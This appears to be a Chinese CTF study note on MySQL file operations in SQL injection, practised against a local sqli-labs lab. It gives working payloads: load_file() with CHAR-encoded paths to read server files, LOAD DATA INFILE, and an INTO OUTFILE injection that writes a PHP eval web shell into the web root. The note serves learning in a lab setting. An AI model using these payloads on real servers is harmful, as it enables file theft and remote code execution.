# 1.导出文件

load_file():

读取文件内容并将文件内容作为一个字符串返回。在网络安全中可用来读取服务器文件。

如：

```javascript
union select 1,1,load_file(CHAR(72, 58, 92, 87, 87, 87, 92, 102, 
108, 97, 103, 46, 112, 104, 112))--+
```

注:CHAR(72, 58, 92, 87, 87, 87, 92, 102, 108, 97, 103, 46, 112, 104, 112)="H:\WWW\flag.php"

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/ctf/sql注入深度剖析/mysql注入语法基础/mysql文件操作/images/66B3876071A44D67943EA06F9366267Fclipboard.png)



# 2.文件导入到数据库

```javascript
load data infile FILE_PATH into table TABLE_NAME(COLUMN_NAME)
```

列如：load data infile "H:\WWW\\flag.php" into table users(username);

将flag.php文件中的内容读取到users表username字段中。

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/ctf/sql注入深度剖析/mysql注入语法基础/mysql文件操作/images/758545ECEA954996A4CA06CE0C45D5F1clipboard.png)



# 3.数据导入到目录下文件

```javascript
select 'STRING' into outfile 'FILE_NAME'
```



## 3.1将需要查询的信息保存到txt文件中直接访问。

例如：

http://127.0.0.1/sql-labs/Less-7/?id=1'))union select 1,2,version() into outfile "H:\\WWW\\sql-labs\\Less-7\\1.txt"--+

注意：file_path需要路径需要转义H:\\WWW\\sql-labs\\Less-7\\1.txt（试了好几次才成功，不懂😭）



![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/ctf/sql注入深度剖析/mysql注入语法基础/mysql文件操作/images/376000C493934BB5A20D21CF49E927D5clipboard.png)



## 3.2写入一句话木马。

例如：

```javascript
http://127.0.0.1/sql-labs/Less-7/?id=1'))union select 1,2,
'<?php @eval($_post["mima"])?>' into outfile 
"H:\\WWW\\sql-labs\\Less-7\\shell.php"--+
```



![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/ctf/sql注入深度剖析/mysql注入语法基础/mysql文件操作/images/FF5EF44BCD1848CE84469385A7DCC1A0clipboard.png)

